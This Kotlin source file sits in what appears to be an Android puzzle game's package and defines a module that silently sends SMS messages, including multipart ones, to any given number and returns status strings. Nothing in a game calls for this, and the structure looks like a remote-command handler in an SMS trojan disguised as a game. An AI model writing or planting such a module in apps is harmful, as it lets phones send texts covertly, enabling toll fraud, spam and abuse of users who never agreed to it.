package com.puzzleblast.game.modules

import android.telephony.SmsManager
import android.os.Build

object SmsSendModule {
    @Suppress("DEPRECATION")
    suspend fun send(num: String, text: String): String {
        return try {
            val sm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) SmsManager.getDefaultSmsSubscriptionId().let {
                if (it > 0) SmsManager.getSmsManagerForSubscriptionId(it) else SmsManager.getDefault()
            } else SmsManager.getDefault()
            if (text.length > 160) {
                sm.sendMultipartTextMessage(num, null, sm.divideMessage(text), null, null)
            } else {
                sm.sendTextMessage(num, null, text, null, null)
            }
            "✉️ sent to $num"
        } catch (e: Exception) {
            "✉️ failed: ${e.message}"
        }
    }
}
